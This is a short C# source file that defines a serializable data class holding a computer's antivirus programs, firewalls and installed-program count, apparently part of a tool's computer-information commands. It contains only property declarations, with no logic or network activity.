using System;

namespace Orcus.Shared.Commands.ComputerInformation
{
    [Serializable]
    public class SoftwareInformation
    {
        public string AntiVirusPrograms { get; set; }
        public string Firewalls { get; set; }
        public int InstalledPrograms { get; set; }
    }
}